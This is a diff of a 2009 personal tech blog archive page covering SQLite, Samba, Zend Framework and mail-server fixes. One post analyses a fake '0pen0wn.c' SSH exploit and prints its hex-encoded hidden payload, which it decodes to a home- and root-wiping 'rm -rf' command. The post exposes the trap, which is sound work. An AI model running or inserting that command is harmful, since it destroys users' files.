@@ -9,7 +9,7 @@
   <meta name="author" content="Thijs Lensselink">
 
   
-  <meta name="description" content="0pen0wn.c What a Joke So there have been a lot of rumors lately about some remote SSH exploit. And to throw a bit of fuel on the fire some hacker / &hellip;">
+  <meta name="description" content="Change Columns Data Type in Sqlite My coworker Chris yesterday asked me how to change a column data type in a database. He wanted to change the data &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -64,6 +64,105 @@
 <header>
 	<header>
 	
+	  <h1 class="entry-title"><a href="http://lenss.nl/2009/07/change-columns-data-type-in-sqlite/">Change Columns Data Type in Sqlite</a></h1>
+	
+	</header>
+</header>
+
+
+  <div class="articletext"><p>My coworker Chris yesterday asked me how to change a column data type in a database. He wanted to change the data type from varchar to text. So my first reaction was to shout ALTER TABLE. But i didn’t realize he was using <a href="http://www.sqlite.org/">sqlite</a> at the moment. So after reading the docs for a while. We came to the conclusion sqlite does support the ALTER statement. But it is very limited compared to say MySQL. And it doesn’t provide the option to alter the data types or column names.</p>
+
+<p>So how should you change a column data type in an sqlite database? Well as far as i can see there is not really a simple solution. But here goes for our work around.</p>
+
+<p>Let’s start off by creating a test database:</p>
+
+<blockquote>
+  <p>sqlite3 test.db  “create table sync (id INTEGER PRIMARY KEY, data VARCHAR, num double, dateIn DATE);”</p>
+</blockquote>
+
+<p>And insert some test data:</p>
+
+<blockquote>
+
+  <p>sqlite3 test.db  “insert into sync (data, num) values (‘This is sampledata’, 3);”
+sqlite3 test.db  “insert into sync (data, num) values (‘More sample data’, 6);”
+sqlite3 test.db  “insert into sync (data, num) values (‘And a little more’, 9);”</p>
+</blockquote>
+
+<p>Now comes the trick. We first create a temporary table and populate it with the data from the table we are going to alter.</p>
+
+<blockquote>
+  <p>sqlite3 test.db  “create table temp_table as select * from sync;”</p>
+</blockquote>
+
+<p>Drop the database to alter. And after that recreate it again. But this time with the changes we wanted to make. So we change the VARCHAR field to TEXT.</p>
+
+<blockquote>
+
+  <p>sqlite3 test.db  “drop table sync;”
+sqlite3 test.db  “create table sync (id INTEGER PRIMARY KEY, data TEXT, num double, dateIn DATE);”</p>
+</blockquote>
+
+<p>The only thing left now is to populate the new database with the data from the temporary table. And finally drop the temporary table.</p>
+
+<blockquote>
+
+  <p>sqlite3 test.db  “insert into sync select * from temp_table;”
+sqlite3 test.db  “drop table temp_table;”</p>
+</blockquote>
+
+<p>There must be a cleaner way to do this. But this worked for us!</p>
+</div>
+  
+  
+
+
+<div style="clear:both;"></div>
+
+  <footer>
+     <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Thijs Lensselink</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2009-07-23T12:53:17+02:00" pubdate data-updated="true">Jul 23<span>rd</span>, 2009</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='http://lenss.nl/tag/tech/'>Tech</a>
+  
+</span>
+
+
+    </p>
+    <div class="share">
+		<ul>
+			<li><a href="http://lenss.nl/2009/07/change-columns-data-type-in-sqlite/#disqus_thread">Comments</a></li>
+		</ul>
+	</div>
+  </footer>
+  </article>
+  
+  
+  <article>
+  
+<header>
+	<header>
+	
 	  <h1 class="entry-title"><a href="http://lenss.nl/2009/07/0pen0wn-c-what-a-joke/">0pen0wn.c What a Joke</a></h1>
 	
 	</header>
@@ -74,17 +173,22 @@
 
 <p>there are three blocks with HEX characters. The last two transform into some perl scripts that seem to make contact with an IRC server. This code seems to be bogus. The first and smallest HEX block is interesting though.</p>
 
-<blockquote><p>\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f
-\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26</p></blockquote>
+<blockquote>
+  <p>\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f
+\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26</p>
+</blockquote>
 
 <p>When decoded back to ASCII characters. This reads:</p>
 
-<blockquote><p>rm -rf ~ /* 2> /dev/null &amp;</p></blockquote>
+<blockquote>
+  <p>rm -rf ~ /* 2&gt; /dev/null &amp;</p>
+</blockquote>
 
 <p>The code used for the decoding is a simple PHP script:</p>
 
 <pre><code>foreach (explode('\x', $str) as $char) echo chr(hexdec($char);
 </code></pre>
+
 </div>
   
   
@@ -142,25 +246,33 @@
 </header>
 
 
-  <div class="articletext"><p>Yesterday i had to reconfigure the samba server at the office. And at the same time change some of the share names we&#8217;ve been using. One of the new names contained a space. And while setting this up on all Windows boxes i noticed no problem.</p>
+  <div class="articletext"><p>Yesterday i had to reconfigure the samba server at the office. And at the same time change some of the share names we’ve been using. One of the new names contained a space. And while setting this up on all Windows boxes i noticed no problem. </p>
 
 <p>After all was finished i went to edit my fstab file so i get the new shares at boot. And after making changes to fstab i always do a simple test</p>
 
-<blockquote><p>sudo mount -a</p></blockquote>
+<blockquote>
+  <p>sudo mount -a</p>
+</blockquote>
 
 <p>This resulted in a syntax error from the fstab file</p>
 
-<blockquote><p>[mntent]: line 13 in /etc/fstab is bad</p></blockquote>
+<blockquote>
+</blockquote>
 
-<p>That&#8217;s nice. So Linux doesn&#8217;t like spaces in the share names. How strange :) So i tried a few escaping sequences.</p>
+<p>That’s nice. So Linux doesn’t like spaces in the share names. How strange :) So i tried a few escaping sequences.</p>
 
-<blockquote><p>&#8216;samba share&#8217;
-&#8220;samba share&#8221;
-samba\ share</p></blockquote>
+<blockquote>
+  <p>‘samba share’
+“samba share”
+samba\ share</p>
+</blockquote>
 
-<p>Non of that seemed to work. So after a bit of searching found the solution. You can use an octal number format to express the ASCII symbol. In this case that&#8217;s &#8216;040&#8217;. And escape it with a slash.</p>
+<p>Non of that seemed to work. So after a bit of searching found the solution. You can use an octal number format to express the ASCII symbol. In this case that’s ‘040’. And escape it with a slash.</p>
 
-<blockquote><p>samba\040share</p></blockquote>
+<blockquote>
+  <p>samba\040share</p>
+</blockquote>
+
 </div>
   
   
@@ -218,9 +330,11 @@ samba\ share</p></blockquote>
 </header>
 
 
-  <div class="articletext"><p>Last night i was trying to push a application to my <a href="http://en.wikipedia.org/wiki/Staging_(websites">staging</a>) environment. When i noticed an error i didn&#8217;t had on my local box.</p>
+  <div class="articletext"><p>Last night i was trying to push a application to my <a href="http://en.wikipedia.org/wiki/Staging_(websites)">staging</a> environment. When i noticed an error i didn’t had on my local box.</p>
 
-<blockquote><p>Notice: Zend_Loader::Zend_Loader::registerAutoload is deprecated as of 1.8.0 and will be removed with 2.0.0; use Zend_Loader_Autoloader instead in /path/to/Zend/Loader.php on line 207</p></blockquote>
+<blockquote>
+  <p>Notice: Zend_Loader::Zend_Loader::registerAutoload is deprecated as of 1.8.0 and will be removed with 2.0.0; use Zend_Loader_Autoloader instead in /path/to/Zend/Loader.php on line 207</p>
+</blockquote>
 
 <p>A quick check revealed that i had a newer version of the <a href="http://framework.zend.com/">Zend Framework</a> loaded on my staging environment. Locally i have 1.7x and on the staging environment i have 1.8x. And according to the documentation the old Zend_Loader is being deprecated in favor of <a href="http://framework.zend.com/manual/en/zend.loader.autoloader.html">Zend_Loader_Autoloader</a>.</p>
 
@@ -237,7 +351,7 @@ $loader = Zend_Loader_Autoloader::getInstance();
 $loader-&gt;registerNamespace('Namespace_');
 </code></pre>
 
-<p>Notice the call to &#8216;registerNamespace&#8217;. This is where you set the namespacing for the classes or application libraries. By default the AutoLoader picks up Zend<em> and ZendX</em> namespacing. And we can extend this to use our own classes and libraries.</p>
+<p>Notice the call to ‘registerNamespace’. This is where you set the namespacing for the classes or application libraries. By default the AutoLoader picks up Zend_ and ZendX_ namespacing. And we can extend this to use our own classes and libraries.</p>
 </div>
   
   
@@ -297,14 +411,14 @@ $loader-&gt;registerNamespace('Namespace_');
 
   <div class="articletext"><p>While working on a small project today. I was confronted with a Zend_Db exception that i have seen before. But it still had me searching for a solution. So this time i will write it done for future reference.</p>
 
-<p>I&#8217;m working on a small ZF project which uses the MVC structure. And in the Initializer the database connection is setup like this:</p>
+<p>I’m working on a small ZF project which uses the MVC structure. And in the Initializer the database connection is setup like this:</p>
 
 <pre><code>public function initDb()
     {
-        $pdoParams = array(
+    	$pdoParams = array(
             PDO::MYSQL_ATTR_USE_BUFFERED_QUERY =&gt; true
         );
-
+        
         $params = array(
             'host'     =&gt; 'localhost',
             'username' =&gt; '***********',
@@ -312,7 +426,7 @@ $loader-&gt;registerNamespace('Namespace_');
             'dbname'   =&gt; '***********',
             'driver_options' =&gt; $pdoParams,
         );
-
+        
         $db = Zend_Db::factory('Pdo_Mysql', $params);
         Zend_Db_Table_Abstract::setDefaultAdapter($db);
         Zend_Registry::set('DB', $db);
@@ -321,9 +435,11 @@ $loader-&gt;registerNamespace('Namespace_');
 
 <p>So when i first instantiated a connection to the database i was presented a nice error on screen. The stack trace is quiet long. But this is the most relevant part.</p>
 
-<blockquote><p>exception &#8216;Zend_Db_Adapter_Exception&#8217; with message &#8216;SQLSTATE[HY000] [2002] Can&#8217;t connect to local MySQL server through socket &#8216;/tmp/mysql.sock&#8217; (2)&#8217;</p></blockquote>
+<blockquote>
+  <p>exception ‘Zend_Db_Adapter_Exception’ with message ‘SQLSTATE[HY000] [2002] Can’t connect to local MySQL server through socket ‘/tmp/mysql.sock’ (2)’</p>
+</blockquote>
 
-<p>The php bug tracker revealed a nice <a href="http://bugs.php.net/bug.php?id=34988">solution</a>. For some strange reason the PDO extension can&#8217;t determine the correct socket while the mysql, mysqli extensions can. This is easily solved in the bootstrap of the project by adding an extra parameter to the config array passed when calling Zend_Db::factory();</p>
+<p>The php bug tracker revealed a nice <a href="http://bugs.php.net/bug.php?id=34988">solution</a>. For some strange reason the PDO extension can’t determine the correct socket while the mysql, mysqli extensions can. This is easily solved in the bootstrap of the project by adding an extra parameter to the config array passed when calling Zend_Db::factory();</p>
 
 <pre><code>$params = array(
             'host'     =&gt; 'localhost',
@@ -333,11 +449,12 @@ $loader-&gt;registerNamespace('Namespace_');
             'driver_options' =&gt; $pdoParams,
             'unix_socket' =&gt; '/var/run/mysqld/mysqld.sock'
         );
-
+        
         $db = Zend_Db::factory('Pdo_Mysql', $params);
         Zend_Db_Table_Abstract::setDefaultAdapter($db);
         Zend_Registry::set('DB', $db);
 </code></pre>
+
 </div>
   
   
@@ -395,24 +512,31 @@ $loader-&gt;registerNamespace('Namespace_');
 </header>
 
 
-  <div class="articletext"><p>The long awaited <a href="http://wiki.php.net/todo/php53">5.3</a> version is near it&#8217;s final stage. I&#8217;ve been really looking forward to this.</p>
+  <div class="articletext"><p>The long awaited <a href="http://wiki.php.net/todo/php53">5.3</a> version is near it’s final stage. I’ve been really looking forward to this.</p>
 
-<blockquote><h6>1. July 24th - feature freeze COMPLETED</h6>
+<blockquote>
 
-<ol>
-<li>July 31st - alpha1 COMPLETED</li>
-<li>September 2nd - alpha2 (freeze on August 29th, final packaging on September 1st) COMPLETED</li>
-<li>December 4th - alpha3 (freeze on December 2nd, final packaging on December 3rd) COMPLETED</li>
-<li>January 29th - beta1 (freeze on January 26th, final packaging on January 28th) COMPLETED</li>
-<li>March 24th - RC1 (bug fixing until the 19th, with RM ok commits until 20nd, until 23rd build fixes only) COMPLETED</li>
-<li>June 7th - RC2 (bug fixing until end of the 4th, after that only build fixes and README changes) COMPLETED</li>
-<li>June 11th - RC3 COMPLETED</li>
-<li>June 18th - RC4 COMPLETED</li>
-<li>June 30th - stable</li>
-<li>Continued RC releases in 2-4 week intervals</li>
-<li>Stable release around Q2 2009</li>
-</ol>
 </blockquote>
+
+<blockquote>
+
+  <h6 id="july-24th---feature-freeze-completed">1. July 24th - feature freeze COMPLETED</h6>
+  <ol>
+    <li>July 31st - alpha1 COMPLETED</li>
+    <li>September 2nd - alpha2 (freeze on August 29th, final packaging on September 1st) COMPLETED</li>
+    <li>December 4th - alpha3 (freeze on December 2nd, final packaging on December 3rd) COMPLETED</li>
+    <li>January 29th - beta1 (freeze on January 26th, final packaging on January 28th) COMPLETED</li>
+    <li>March 24th - RC1 (bug fixing until the 19th, with RM ok commits until 20nd, until 23rd build fixes only) COMPLETED</li>
+    <li>June 7th - RC2 (bug fixing until end of the 4th, after that only build fixes and README changes) COMPLETED</li>
+    <li>June 11th - RC3 COMPLETED</li>
+    <li>June 18th - RC4 COMPLETED</li>
+    <li>June 30th - stable</li>
+    <li>Continued RC releases in 2-4 week intervals</li>
+    <li>Stable release around Q2 2009</li>
+  </ol>
+
+</blockquote>
+
 </div>
   
   
@@ -470,13 +594,16 @@ $loader-&gt;registerNamespace('Namespace_');
 </header>
 
 
-  <div class="articletext"><p><a href="http://lenss.nl/images/2009/06/IMG_0303.jpg"><img src="http://lenss.nl/images/2009/06/IMG_0303-150x150.jpg" alt="IMG_0303" /></a></p>
+  <div class="articletext"><p>[<img src="http://lenss.nl/images/2009/06/IMG_0303.jpg" alt="IMG_0303](http://lenss.nl/images/2009/06/IMG_0303-150x150.jpg)" /></p>
 
-<p>A few days ago i received the latest version of the <a href="http://informationarchitects.jp/wtm4/">IA Trend Map</a>. This year even the tube it was shipped in looks good! This years design is a landscape view. Which forces me to buy a new frame. But it&#8217;s worth it. Now only need to find a spot for it.</p>
+<p>A few days ago i received the latest version of the <a href="http://informationarchitects.jp/wtm4/">IA Trend Map</a>. This year even the tube it was shipped in looks good! This years design is a landscape view. Which forces me to buy a new frame. But it’s worth it. Now only need to find a spot for it.</p>
 
 <p>The map visualizes the main websites / companies based on a hand full of variables. Where height stands for the success rate and width for the stability. This all is spread on top of the Tokyo Metro Subway. The 13 subway lines reflect different web sectors in which the companies / websites opperate. A new addition to the map this year are the people behind the companies / websites. Which gives just that little bit of extra information.</p>
 
-<blockquote><p>The map depicts each website or company as a Tokyo station that corresponds in buzz, traffic, revenue, and age. The height of a station represents success, while its width indicates the stability of the domain.</p></blockquote>
+<blockquote>
+  <p>The map depicts each website or company as a Tokyo station that corresponds in buzz, traffic, revenue, and age. The height of a station represents success, while its width indicates the stability of the domain.</p>
+</blockquote>
+
 </div>
   
   
@@ -534,17 +661,23 @@ $loader-&gt;registerNamespace('Namespace_');
 </header>
 
 
-  <div class="articletext"><p>While installing a new mail server i ran into a problem with SMTP authentication. The mail server in question is postfix installed on a Debian lenny box. The backend for postfix is MySQL. And because <a href="http://asg.web.cmu.edu/sasl/">SASL</a> is always a pain to configure i used <a href="http://www.dovecot.org/">dovecot</a> to do the SMTP authentication with the MySQL backend. This however resulted in the following error</p>
+  <div class="articletext"><p>While installing a new mail server i ran into a problem with SMTP authentication. The mail server in question is postfix installed on a Debian lenny box. The backend for postfix is MySQL. And because <a href="http://asg.web.cmu.edu/sasl/">SASL</a> is always a pain to configure i used <a href="http://www.dovecot.org/">dovecot</a> to do the SMTP authentication with the MySQL backend. This however resulted in the following error </p>
 
-<blockquote><p>Jun 21 17:43:02 ims1 dovecot: auth-worker(default): mysql: Connect failed to localhost (mail): Access denied for user &#8216;mail_admin&#8217;@&#8217;localhost&#8217; (using password: YES) - waiting for 1 seconds before retry</p></blockquote>
+<blockquote>
+  <p>Jun 21 17:43:02 ims1 dovecot: auth-worker(default): mysql: Connect failed to localhost (mail): Access denied for user ‘mail_admin’@’localhost’ (using password: YES) - waiting for 1 seconds before retry</p>
+</blockquote>
 
-<p>It took me a while to figure this out. The settings in &#8216;dovecot-sql.conf&#8217; were correct. Logging in with the same data from a shell went without a problem. I remembered i had this problem some years ago. With a <a href="http://www.inter7.com/index.php?page=vpopmail">vpopmail</a> setup. The problem then was the encryption algorithm used by MySQL. So i tried to use the older encryption algorithm.</p>
+<p>It took me a while to figure this out. The settings in ‘dovecot-sql.conf’ were correct. Logging in with the same data from a shell went without a problem. I remembered i had this problem some years ago. With a <a href="http://www.inter7.com/index.php?page=vpopmail">vpopmail</a> setup. The problem then was the encryption algorithm used by MySQL. So i tried to use the older encryption algorithm.</p>
 
-<blockquote><p>SET PASSWORD FOR &#8216;user&#8217;@&#8217;localhost&#8217; = OLD_PASSWORD(&#8216;password&#8217;);</p></blockquote>
+<blockquote>
+  <p>SET PASSWORD FOR ‘user’@’localhost’ = OLD_PASSWORD(‘password’);</p>
+</blockquote>
 
-<p>After a restart everything was fine.</p>
+<p>After a restart everything was fine. </p>
 
-<blockquote><p>Jun 21 18:41:03 ims1 dovecot: auth-worker(default): mysql: Connected to localhost (mail)</p></blockquote>
+<blockquote>
+  <p>Jun 21 18:41:03 ims1 dovecot: auth-worker(default): mysql: Connected to localhost (mail)</p>
+</blockquote>
 
 <p>Like i said it took me a while to figure out. So maybe i can safe somebody some time.</p>
 </div>
@@ -604,13 +737,14 @@ $loader-&gt;registerNamespace('Namespace_');
 </header>
 
 
-  <div class="articletext"><p>Last week i moved one of our domains to a new server. After syncing all the email between two servers i was happy i didn&#8217;t had any problems in the process. But a few days later one of the girls in the office noticed she can&#8217;t share labels anymore. This is a big problem since we have one mailbox that is shared over 4 people. When somebody works on a newly arrived mail they can tag it so the others can see it&#8217;s being worked on.</p>
+  <div class="articletext"><p>Last week i moved one of our domains to a new server. After syncing all the email between two servers i was happy i didn’t had any problems in the process. But a few days later one of the girls in the office noticed she can’t share labels anymore. This is a big problem since we have one mailbox that is shared over 4 people. When somebody works on a newly arrived mail they can tag it so the others can see it’s being worked on.</p>
 
-<p>So after some hour of playing with settings i figured out the problem was SSL. If i disable SSL the labels come through normally. If i enable SSL no labels are being loaded. At this moment i am not sure if it&#8217;s a mail server issue, a mis configured SSL certificate or maybe a bug in Thunderbird. Will do some more research when i get back from my well deserved vacation.</p>
+<p>So after some hour of playing with settings i figured out the problem was SSL. If i disable SSL the labels come through normally. If i enable SSL no labels are being loaded. At this moment i am not sure if it’s a mail server issue, a mis configured SSL certificate or maybe a bug in Thunderbird. Will do some more research when i get back from my well deserved vacation. </p>
 
-<p>There seems to be some sort of <a href="https://addons.mozilla.org/nl/thunderbird/addons/versions/8919">solution</a> available in the form of an extension for Thunderbird. But it&#8217;s only available for v3 and up!</p>
+<p>There seems to be some sort of <a href="https://addons.mozilla.org/nl/thunderbird/addons/versions/8919">solution</a> available in the form of an extension for Thunderbird. But it’s only available for v3 and up!</p>
 
-<p>So the workaround for now is to disable SSL. I&#8217;m not to happy about it. But it will do for now.</p>
+<p>So the workaround for now is to disable SSL. I’m not to happy about it. But it will do for now.</p>
+
 </div>
   
   
@@ -668,11 +802,13 @@ $loader-&gt;registerNamespace('Namespace_');
 </header>
 
 
-  <div class="articletext"><p>I&#8217;ve been a member of PHPGG for a while. It&#8217;s the Dutch PHP user group. And it seems they have combined forces with the Belgium PHP user group. And started the all new <a href="http://phpbenelux.eu/">PHPBenelux</a>. As quoted from the new website.</p>
+  <div class="articletext"><p>I’ve been a member of PHPGG for a while. It’s the Dutch PHP user group. And it seems they have combined forces with the Belgium PHP user group. And started the all new <a href="http://phpbenelux.eu/">PHPBenelux</a>. As quoted from the new website.</p>
 
-<blockquote><p>PHPBenelux aims to be the Belgium, Netherlands and Luxemburg community</p></blockquote>
+<blockquote>
+  <p>PHPBenelux aims to be the Belgium, Netherlands and Luxemburg community</p>
+</blockquote>
 
-<p>They already brought us a cool <a href="http://qa.php.net/testfest.php">testFest</a> last year. Which i didn&#8217;t have the time for this year. But they organize some nice stuff. So if your a PHP Developer from the <a href="http://en.wikipedia.org/wiki/Benelux">Benelux</a>. Sign up.</p>
+<p>They already brought us a cool <a href="http://qa.php.net/testfest.php">testFest</a> last year. Which i didn’t have the time for this year. But they organize some nice stuff. So if your a PHP Developer from the <a href="http://en.wikipedia.org/wiki/Benelux">Benelux</a>. Sign up.</p>
 </div>
   
   
@@ -713,135 +849,6 @@ $loader-&gt;registerNamespace('Namespace_');
     <div class="share">
 		<ul>
 			<li><a href="http://lenss.nl/2009/05/phpbenelux-kick-off/#disqus_thread">Comments</a></li>
-		</ul>
-	</div>
-  </footer>
-  </article>
-  
-  
-  <article>
-  
-<header>
-	<header>
-	
-	  <h1 class="entry-title"><a href="http://lenss.nl/2009/05/fraudulent-site-please-shut-down/">Fraudulent Site, Please Shut Down</a></h1>
-	
-	</header>
-</header>
-
-
-  <div class="articletext"><p>Well the title says it all doesn&#8217;t it. Today at work i was checking my mail and noticed and email from <a href="http://rsa.com/">RSA security</a> with the subject line <strong>Fraudulent site, please shut down! [ING-NL 287] DOMAIN: lenss.nl</strong>.</p>
-
-<blockquote><p>RSA, an anti-fraud and security company, is under contract to assist ING
-Netherlands   in
-preventing or terminating online activity that targets, or may
-potentially target ING
-Netherlands clients as potential fraud victims.</p></blockquote>
-
-<p>RSA has been made aware that a domain name, which abuses ING Netherlands
-trademark, has been registered with you. This domain
-http://lenss.nl/bank/  not only violates ING Netherlands copyright,
-trademarks and other intellectual property rights, but may also become a
-host to a phishing attack, or other fraudulent scams against the bank
-and the bank&#8217;s clients.</p>
-
-<p>A few minutes after this email an other email came in from <a href="http://openprovider.nl">openprovider</a>. These guys manage my domains. The notified me the domain was no moved to their DNS servers and was there for blocked.</p>
-
-<blockquote><p>Wij ontvingen onderstaande klacht over een van uw domeinen, lenss.nl. Vanwege de ernst
-heb ik per direct het domein gedeactiveerd door het op lege nameservers te zetten.</p></blockquote>
-
-<p>Ik verzoek u deze case met gepaste urgentie te behandelen en de aanklager daarvan op de
-hoogte te stellen.</p>
-
-<p>When i was reading the email from RSA i was pretty shocked. But when reading the email from Openprovider i just got pissed. Why on earth would they disable my domain without doing any research in the matter. They should have contacted me before they took action. So i contacted the guys at RSA and explained the situation. They advised me to send them an email with the explanation. And so i did. They responded quite fast with the following message:</p>
-
-<blockquote><p>Thank you for your co-operation in this matter.
-The AFCC can confirm that the site in question had no malicious content,
-while it did seem suspicious because of its content, it being freely
-accessible and its vague purpose.
-The current solution and explanation suggested below by the website
-owner is satisfying and will likely prevent such confusions in the
-future. Therefore the AFCC has no objection whatsoever to bringing the
-site in question back up.</p></blockquote>
-
-<p>So the problem is solved i assumed. But an hour later my domain went offline. And i couldn&#8217;t get to my mailbox anymore. The domain was still running on the Openprovider DNS servers. So let&#8217;s give them a call i thought. But i guess today is just not my day. Their website was offline. And i couldn&#8217;t find any contact information. So i sat back and waited a bit. Didn&#8217;t really know what to do. After some time their site came back online. And i was able to find a phone number.</p>
-
-<p>After explaining my story i got the comment please send us an email. But this was not possible anymore since my DNS was changed. So after some pursuance i was put through with the person who emailed me in the first place. The reason they took it offline was because the complaint came from RSA. Which seems to be an authority on this subject. I explained the situation. And told them i was not very happy with the way the handled the situation. After blowing off some steam we agreed the DNS could be changed back again. Which they did!</p>
-
-<p>While checking my log files i noticed the insane long scan on this web server&#8230;</p>
-
-<blockquote><p>82.81.26.105 - - [14/May/2009:04:16:12 -0400] &#8220;GET /bank/Scrisoare.txt HTTP/1.1&#8221; 301 314 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#8221;
-82.81.26.105 - - [14/May/2009:04:16:13 -0400] &#8220;GET /bank/scan2.txt HTTP/1.1&#8221; 301 310 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#8221;
-82.81.26.105 - - [14/May/2009:04:16:13 -0400] &#8220;GET /bank/aScprivate.txt HTTP/1.1&#8221; 301 315 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#8221;
-82.81.26.105 - - [14/May/2009:04:16:14 -0400] &#8220;GET /bank/a.tgz HTTP/1.1&#8221; 301 306 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#8221;
-82.81.26.105 - - [14/May/2009:04:16:14 -0400] &#8220;GET /bank/forums.zip HTTP/1.1&#8221; 301 311 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#8221;</p></blockquote>
-
-<p>that just went on and on for several minutes. Which was done by some Israeli company?</p>
-
-<blockquote><p>82.81.26.105 - - [14/May/2009:04:21:44 -0400] &#8220;POST /bank/dom57.php HTTP/1.1&#8221; 301 310 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#8221;
-82.81.26.105 - - [14/May/2009:04:21:45 -0400] &#8220;POST /bank/bl.php HTTP/1.1&#8221; 301 307 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#8221;
-82.81.26.105 - - [14/May/2009:04:21:45 -0400] &#8220;POST /bank/people.php HTTP/1.1&#8221; 301 311 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#8221;</p></blockquote>
-
-<p>And a visit from the guys in Redmond.</p>
-
-<blockquote><p>131.107.0.114 - - [14/May/2009:04:20:59 -0400] &#8220;GET /bank HTTP/1.1&#8221; 301 300 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#8221;
-131.107.0.114 - - [14/May/2009:04:20:59 -0400] &#8220;GET /bank/ HTTP/1.1&#8221; 200 142 &#8220;-&#8221; &#8220;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#8221;</p></blockquote>
-
-<p>My DSL provider..</p>
-
-<blockquote><p>82.93.147.119 - - [14/May/2009:04:25:23 -0400] &#8220;GET /bank HTTP/1.0&#8221; 301 300 &#8220;-&#8221; &#8220;Wget/1.11.4&#8221;
-82.93.147.119 - - [14/May/2009:04:25:23 -0400] &#8220;GET /bank/ HTTP/1.0&#8221; 200 142 &#8220;-&#8221; &#8220;Wget/1.11.4&#8221;</p></blockquote>
-
-<p>My co-locator..</p>
-
-<blockquote><p>208.69.120.120 - - [14/May/2009:06:29:24 -0400] &#8220;GET /favicon.ico HTTP/1.1&#8221; 301 307 &#8220;-&#8221; &#8220;Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729)&#8221;
-208.69.120.120 - - [14/May/2009:06:29:24 -0400] &#8220;GET /favicon.ico/ HTTP/1.1&#8221; 404 20584 &#8220;-&#8221; &#8220;Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729)&#8221;</p></blockquote>
-
-<p>And probably some more. It&#8217;s amazing how fast things go.</p>
-
-<p><em>So why did this all happen? Some time ago a friend pointed out that she could not go to the ING bank website from here work. So to help here out a bit. I created a small proxy script that made it possible for her to login to the bank website. This script was under /bank. I admit i should have password protected this page. But i didn&#8217;t see any evil in it. So i left it open. The only thing it did was proxy the requests through my server. Right now i just removed the whole script. And will keep it like that!</em></p>
-
-<p>The situation i got in today was not very pleasent. But i have to say i am happy with the work RSA Security does. And i am happy RSA and Openprovider assisted me in resolving this case. Thanks guys. But next time please do some more research!</p>
-</div>
-  
-  
-
-
-<div style="clear:both;"></div>
-
-  <footer>
-     <p class="meta">
-      
-  
-
-<span class="byline author vcard">Posted by <span class="fn">Thijs Lensselink</span></span>
-
-      
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2009-05-14T15:13:17+02:00" pubdate data-updated="true">May 14<span>th</span>, 2009</time>
-      
-
-<span class="categories">
-  
-    <a class='category' href='http://lenss.nl/tag/tech/'>Tech</a>
-  
-</span>
-
-
-    </p>
-    <div class="share">
-		<ul>
-			<li><a href="http://lenss.nl/2009/05/fraudulent-site-please-shut-down/#disqus_thread">Comments</a></li>
 		</ul>
 	</div>
   </footer>
@@ -899,6 +906,8 @@ site in question back up.</p></blockquote>
 	<h1>Recent entries</h1>
 	<ul class="linklist">
 		
+		<li><a href="http://lenss.nl/2013/06/php-55-released/"><span class="higlight">June, 2013</span> PHP 5.5.0 released</a></li>
+		
 		<li><a href="http://lenss.nl/2013/03/casting-weirdness-with-PHP/"><span class="higlight">March, 2013</span> Casting weirdness with PHP</a></li>
 		
 		<li><a href="http://lenss.nl/2013/02/zend-optimizer%2B-integrated-in-5.5/"><span class="higlight">February, 2013</span> Zend Optimizer+ integrated into 5.5</a></li>
@@ -916,8 +925,6 @@ site in question back up.</p></blockquote>
 		<li><a href="http://lenss.nl/2012/09/fixing-character-replacement-in-wordpress/"><span class="higlight">September, 2012</span> Fixing character replacement in Wordpress</a></li>
 		
 		<li><a href="http://lenss.nl/2012/09/resize-a-vagrant-vmdk-drive/"><span class="higlight">September, 2012</span> Resize a Vagrant VMDK drive</a></li>
-		
-		<li><a href="http://lenss.nl/2012/09/git-coming-up-with-a-good-workflow/"><span class="higlight">September, 2012</span> GIT:  Coming up with a good workflow</a></li>
 		
 	</ul>
 </div>
@@ -938,7 +945,7 @@ site in question back up.</p></blockquote>
 </div>
 <div class="sidebox">
 	<h1>Tags</h1>
